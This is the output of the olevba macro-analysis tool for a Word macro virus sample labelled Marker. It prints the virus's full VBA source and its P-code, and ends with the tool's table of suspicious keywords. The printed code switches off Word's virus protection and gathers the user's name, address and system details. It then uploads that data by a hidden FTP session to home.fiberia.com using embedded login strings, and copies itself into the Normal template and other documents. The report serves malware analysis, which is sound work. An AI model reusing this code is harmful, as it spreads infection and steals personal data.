olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Marker.ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Marker.ee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
' Surveyor, Developed by:
' An MCA Student
' School Of Technology And Applied Sciences
' Mahatham Gandhi University Regional Center
' Edappally, Kochi 24
' 16th March 2000
Const Signature = "School Of Technology And Applied Sciences"
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ActiveDoc, NormalTemplt As Object
Dim UserAddress, ReportFile, ReportData, MyCode, Message As String

Message = "Today is Independence day." & Chr(13) & Chr(13) & "Vandhay Matharam!"
Set ActiveDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NormalTemplt = NormalTemplate.VBProject.VBComponents.Item(1)
Options.VirusProtection = False
DocumentInfected = ActiveDoc.CodeModule.Find(Signature, 1, 1, 9999, 9999)
NormalTemplateInfected = NormalTemplt.CodeModule.Find(Signature, 1, 1, 9999, 9999)
If (Day(Now()) = 15) And (Month(Now()) = 8) Then
    MsgBox Message, vbInformation + vbOKOnly, "Independence Day"
End If
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = False) Then
    With Application
    ReportData = "Name: " & .UserName & Chr(13) & vbLf _
    & "Address: " & .UserAddress & Chr(13) & vbLf _
    & "Date & Time: " & Format(Date, "dddd, d mmm yyyy ") _
    & Format(Time, "hh:mm:ss AMPM ") & Chr(13) & vbLf _
    & "Processor Type:" & System.ProcessorType & Chr(13) & vbLf _
    & "Free Disk Space: " & System.FreeDiskSpace
    End With
    For i = 1 To 4
         ReportFile = ReportFile + Mid(Str(Int(90001 * Rnd + 9999)), 2, 1)
    Next i
    ReportFile = "C:\su" & ReportFile & ".sys"
    Open ReportFile For Output As #1
    Print #1, ReportData
    Close #1
    
    Open "c:\netacc.vxd" For Output As #1
    Print #1, "o home.fiberia.com"
    Print #1, "user surveyor"
    Print #1, "fAERTf"
    Print #1, "cd survey"
    Print #1, "ascii"
    Print #1, "put " & ReportFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netacc.vxd", vbHide
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Uploaded") = True
End If

If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
    (ActiveDocument.SaveFormat = wdFormatDocument Or _
    ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   If DocumentInfected = True Then
      SaveNormalTemplate = NormalTemplate.Saved
      MyCode = ActiveDoc.CodeModule.Lines(1, ActiveDoc.CodeModule.CountOfLines)
      
      NormalTemplt.CodeModule.DeleteLines 1, NormalTemplt.CodeModule.CountOfLines
      NormalTemplt.CodeModule.AddFromString MyCode
    End If
    If SaveNormalTemplate = True Then
        NormalTemplate.Save
    End If
    

    If NormalTemplateInfected = True And _
         (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
        ActiveDocument.Saved = False) Then
  
        SaveDocument = ActiveDocument.Saved
    
        MyCode = NormalTemplt.CodeModule.Lines(1, NormalTemplt.CodeModule.CountOfLines)

        ActiveDoc.CodeModule.DeleteLines 1, ActiveDoc.CodeModule.CountOfLines
        ActiveDoc.CodeModule.AddFromString MyCode
    
    If SaveDocument = True Then
        ActiveDocument.Save
    End If
   End If
  
End If
  
End Sub










-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Marker.ee
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 6128 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x0018 " Surveyor, Developed by:"
' Line #3:
' 	QuoteRem 0x0000 0x000F " An MCA Student"
' Line #4:
' 	QuoteRem 0x0000 0x002A " School Of Technology And Applied Sciences"
' Line #5:
' 	QuoteRem 0x0000 0x002B " Mahatham Gandhi University Regional Center"
' Line #6:
' 	QuoteRem 0x0000 0x0014 " Edappally, Kochi 24"
' Line #7:
' 	QuoteRem 0x0000 0x0010 " 16th March 2000"
' Line #8:
' 	Dim (Const) 
' 	LitStr 0x0029 "School Of Technology And Applied Sciences"
' 	VarDefn Signature
' Line #9:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #10:
' 	Dim 
' 	VarDefn ActiveDoc
' 	VarDefn NormalTemplt (As Object)
' Line #11:
' 	Dim 
' 	VarDefn UserAddress
' 	VarDefn ReportFile
' 	VarDefn ReportData
' 	VarDefn MyCode
' 	VarDefn Message (As String)
' Line #12:
' Line #13:
' 	LitStr 0x001A "Today is Independence day."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0011 "Vandhay Matharam!"
' 	Concat 
' 	St Message 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ActiveDoc 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NormalTemplt 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #17:
' 	Ld Signature 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x270F 
' 	LitDI2 0x270F 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #18:
' 	Ld Signature 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x270F 
' 	LitDI2 0x270F 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #19:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000F 
' 	Eq 
' 	Paren 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #20:
' 	Ld Message 
' 	Ld vbInformation 
' 	Ld vbOKOnly 
' 	Add 
' 	LitStr 0x0010 "Independence Day"
' 	ArgsCall MsgBox 0x0003 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Uploaded"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #23:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #24:
' 	LineCont 0x0014 0D 00 04 00 19 00 04 00 22 00 04 00 30 00 04 00 3D 00 04 00
' 	LitStr 0x0006 "Name: "
' 	MemLdWith UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0009 "Address: "
' 	Concat 
' 	MemLdWith UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x000D "Date & Time: "
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0011 "dddd, d mmm yyyy "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Time 
' 	LitStr 0x000E "hh:mm:ss AMPM "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x000F "Processor Type:"
' 	Concat 
' 	Ld System 
' 	MemLd ProcessorType 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld vbLf 
' 	Concat 
' 	LitStr 0x0011 "Free Disk Space: "
' 	Concat 
' 	Ld System 
' 	MemLd FreeDiskSpace 
' 	Concat 
' 	St ReportData 
' Line #25:
' 	EndWith 
' Line #26:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #27:
' 	Ld ReportFile 
' 	LitDI4 0x5F91 0x0001 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x270F 
' 	Add 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St ReportFile 
' Line #28:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	LitStr 0x0005 "C:\su"
' 	Ld ReportFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St ReportFile 
' Line #30:
' 	Ld ReportFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld ReportData 
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #33:
' Line #34:
' 	LitStr 0x000D "c:\netacc.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "o home.fiberia.com"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "user surveyor"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "fAERTf"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "cd survey"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld ReportFile 
' 	Concat 
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #43:
' Line #44:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netacc.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #45:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Uploaded"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #46:
' 	EndIfBlock 
' Line #47:
' Line #48:
' 	LineCont 0x0008 0B 00 04 00 12 00 04 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' Line #50:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #51:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #52:
' 	LitDI2 0x0001 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCode 
' Line #53:
' Line #54:
' 	LitDI2 0x0001 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #55:
' 	Ld MyCode 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' Line #61:
' Line #62:
' 	LineCont 0x0008 05 00 09 00 13 00 08 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #63:
' Line #64:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #65:
' Line #66:
' 	LitDI2 0x0001 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld NormalTemplt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St MyCode 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #69:
' 	Ld MyCode 
' 	Ld ActiveDoc 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #70:
' Line #71:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndIfBlock 
' Line #75:
' Line #76:
' 	EndIfBlock 
' Line #77:
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

